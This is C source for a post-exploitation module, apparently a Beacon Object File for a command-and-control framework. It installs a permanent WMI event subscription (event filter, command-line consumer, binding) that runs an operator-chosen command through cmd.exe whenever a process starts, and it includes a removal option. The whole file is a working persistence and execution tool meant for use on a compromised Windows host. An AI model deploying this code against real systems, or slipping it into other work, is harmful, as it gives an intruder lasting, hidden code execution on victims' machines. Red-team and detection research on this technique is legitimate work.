/*
 * bof-wmisubscription <name> <command|remove> [filter-query]
 *
 * Create a permanent WMI event subscription in ROOT\subscription:
 *   __EventFilter  +  CommandLineEventConsumer  +  __FilterToConsumerBinding
 *
 * The default trigger fires on process creation in Win32_Process.  Supply a
 * custom WQL filter as the third argument.  `remove` deletes the binding,
 * consumer and filter with the same name.
 *
 * Requires administrator rights (the ROOT\subscription namespace is
 * privileged).  Note that this leaves a visible permanent subscription; use
 * it only where that trade-off is acceptable.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#ifndef RPC_C_AUTHN_WINNT
#define RPC_C_AUTHN_WINNT 10
#endif
#ifndef RPC_C_AUTHZ_NONE
#define RPC_C_AUTHZ_NONE 0
#endif
#ifndef RPC_C_AUTHN_LEVEL_CALL
#define RPC_C_AUTHN_LEVEL_CALL 3
#endif
#ifndef RPC_C_IMP_LEVEL_IMPERSONATE
#define RPC_C_IMP_LEVEL_IMPERSONATE 3
#endif
#ifndef EOAC_NONE
#define EOAC_NONE 0
#endif

static const GUID wsub_clsid_wbemlocator =
    {0x4590f811, 0x1d3a, 0x11d0, {0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
static const GUID wsub_iid_iwbemlocator =
    {0xdc12a687, 0x737f, 0x11cf, {0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};

static void put_str(IWbemClassObject *obj, const wchar_t *name,
                    const wchar_t *val)
{
    VARIANT v;
    OLEAUT32$VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = OLEAUT32$SysAllocString(val);
    if (v.bstrVal)
        obj->lpVtbl->Put(obj, name, 0, &v, CIM_STRING);
    OLEAUT32$VariantClear(&v);
}

static HRESULT spawn_instance(IWbemServices *svc, const wchar_t *cls,
                              IWbemClassObject **out)
{
    BSTR b = OLEAUT32$SysAllocString(cls);
    IWbemClassObject *klass = NULL;
    HRESULT hr;

    *out = NULL;
    if (!b) return E_OUTOFMEMORY;
    hr = svc->lpVtbl->GetObject(svc, b, 0, NULL, &klass, NULL);
    OLEAUT32$SysFreeString(b);
    if (FAILED(hr) || !klass) return hr;
    hr = klass->lpVtbl->SpawnInstance(klass, 0, out);
    klass->lpVtbl->Release(klass);
    return hr;
}

static HRESULT put_instance(IWbemServices *svc, IWbemClassObject *inst)
{
    return svc->lpVtbl->PutInstance(svc, inst, WBEM_FLAG_CREATE_OR_UPDATE,
                                    NULL, NULL);
}

static HRESULT delete_path(IWbemServices *svc, const wchar_t *path)
{
    BSTR b = OLEAUT32$SysAllocString(path);
    HRESULT hr;
    if (!b) return E_OUTOFMEMORY;
    hr = svc->lpVtbl->DeleteInstance(svc, b, 0, NULL, NULL);
    OLEAUT32$SysFreeString(b);
    return hr;
}

void go(char *args, int alen)
{
    datap parser;
    char *name, *command, *filter = "";
    int nlen, clen, flen;
    wchar_t wname[256], wcmd[2048], wfilter[2048], wpath[4096], wbind[4096];
    BSTR ns = NULL;
    IWbemLocator *loc = NULL;
    IWbemServices *svc = NULL;
    IWbemClassObject *inst = NULL;
    HRESULT hr;
    int coinit = 0, remove;

    BeaconDataParse(&parser, args, alen);
    name    = BeaconDataExtract(&parser, &nlen);
    command = BeaconDataExtract(&parser, &clen);
    filter  = BeaconDataExtract(&parser, &flen);
    if (!name || !name[0] || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: wmisubscription <name> <command|remove> [filter-query]\n");
        return;
    }
    if (!filter) filter = "";
    remove = bof_stricmp(command, "remove") == 0 ||
             bof_stricmp(command, "delete") == 0;

    if (bof_a2w(name, wname, 256) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "name too long\n");
        return;
    }
    if (!remove) {
        if (!filter[0])
            filter = "SELECT * FROM __InstanceCreationEvent WITHIN 60 "
                     "WHERE TargetInstance ISA 'Win32_Process'";
        if (bof_a2w(command, wcmd, 2048) <= 0 ||
            bof_a2w(filter, wfilter, 2048) <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "command/filter too long\n");
            return;
        }
    }

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) coinit = 1;
    else if (hr != (HRESULT)0x80010106L) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx: 0x%08lx\n",
                     (unsigned long)hr);
        return;
    }

    ns = OLEAUT32$SysAllocString(L"ROOT\\subscription");
    if (!ns) goto cleanup;
    hr = OLE32$CoCreateInstance(&wsub_clsid_wbemlocator, NULL,
                                CLSCTX_INPROC_SERVER, &wsub_iid_iwbemlocator,
                                (void **)&loc);
    if (FAILED(hr) || !loc) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance(WbemLocator): 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    hr = loc->lpVtbl->ConnectServer(loc, ns, NULL, NULL, NULL, 0, NULL, NULL,
                                    &svc);
    if (FAILED(hr) || !svc) {
        BeaconPrintf(CALLBACK_ERROR, "ConnectServer(ROOT\\subscription): 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    OLE32$CoSetProxyBlanket((IUnknown *)svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                            NULL, RPC_C_AUTHN_LEVEL_CALL,
                            RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    if (remove) {
        bof_wcsncpy(wbind, L"__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"", 4096);
        bof_wcsncat(wbind, wname, 4096 - bof_wcslen(wbind) - 1);
        bof_wcsncat(wbind, L"\\\"\",Consumer=\"CommandLineEventConsumer.Name=\\\"", 4096 - bof_wcslen(wbind) - 1);
        bof_wcsncat(wbind, wname, 4096 - bof_wcslen(wbind) - 1);
        bof_wcsncat(wbind, L"\\\"\"", 4096 - bof_wcslen(wbind) - 1);
        hr = delete_path(svc, wbind);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] binding delete: 0x%08lx\n",
                     (unsigned long)hr);

        bof_wcsncpy(wpath, L"CommandLineEventConsumer.Name=\"", 4096);
        bof_wcsncat(wpath, wname, 4096 - bof_wcslen(wpath) - 1);
        bof_wcsncat(wpath, L"\"", 4096 - bof_wcslen(wpath) - 1);
        hr = delete_path(svc, wpath);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] consumer delete: 0x%08lx\n",
                     (unsigned long)hr);

        bof_wcsncpy(wpath, L"__EventFilter.Name=\"", 4096);
        bof_wcsncat(wpath, wname, 4096 - bof_wcslen(wpath) - 1);
        bof_wcsncat(wpath, L"\"", 4096 - bof_wcslen(wpath) - 1);
        hr = delete_path(svc, wpath);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] filter delete: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    /* __EventFilter */
    hr = spawn_instance(svc, L"__EventFilter", &inst);
    if (FAILED(hr) || !inst) {
        BeaconPrintf(CALLBACK_ERROR, "spawn __EventFilter: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    put_str(inst, L"Name", wname);
    put_str(inst, L"QueryLanguage", L"WQL");
    put_str(inst, L"Query", wfilter);
    put_str(inst, L"EventNamespace", L"root\\cimv2");
    hr = put_instance(svc, inst);
    inst->lpVtbl->Release(inst);
    inst = NULL;
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "put __EventFilter: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    /* CommandLineEventConsumer */
    hr = spawn_instance(svc, L"CommandLineEventConsumer", &inst);
    if (FAILED(hr) || !inst) {
        BeaconPrintf(CALLBACK_ERROR, "spawn CommandLineEventConsumer: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    put_str(inst, L"Name", wname);
    put_str(inst, L"CommandLineTemplate", wcmd);
    put_str(inst, L"ExecutablePath", L"C:\\Windows\\System32\\cmd.exe");
    hr = put_instance(svc, inst);
    inst->lpVtbl->Release(inst);
    inst = NULL;
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "put CommandLineEventConsumer: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    /* __FilterToConsumerBinding */
    hr = spawn_instance(svc, L"__FilterToConsumerBinding", &inst);
    if (FAILED(hr) || !inst) {
        BeaconPrintf(CALLBACK_ERROR, "spawn __FilterToConsumerBinding: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    bof_wcsncpy(wpath, L"__EventFilter.Name=\"", 4096);
    bof_wcsncat(wpath, wname, 4096 - bof_wcslen(wpath) - 1);
    bof_wcsncat(wpath, L"\"", 4096 - bof_wcslen(wpath) - 1);
    bof_wcsncpy(wbind, L"CommandLineEventConsumer.Name=\"", 4096);
    bof_wcsncat(wbind, wname, 4096 - bof_wcslen(wbind) - 1);
    bof_wcsncat(wbind, L"\"", 4096 - bof_wcslen(wbind) - 1);
    put_str(inst, L"Filter", wpath);
    put_str(inst, L"Consumer", wbind);
    hr = put_instance(svc, inst);
    inst->lpVtbl->Release(inst);
    inst = NULL;
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "put __FilterToConsumerBinding: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] WMI subscription created: %s\n", name);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] filter: %s\n", filter);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] remove: wmisubscription %s remove\n", name);

cleanup:
    if (inst) inst->lpVtbl->Release(inst);
    if (svc) svc->lpVtbl->Release(svc);
    if (loc) loc->lpVtbl->Release(loc);
    if (ns) OLEAUT32$SysFreeString(ns);
    if (coinit) OLE32$CoUninitialize();
}
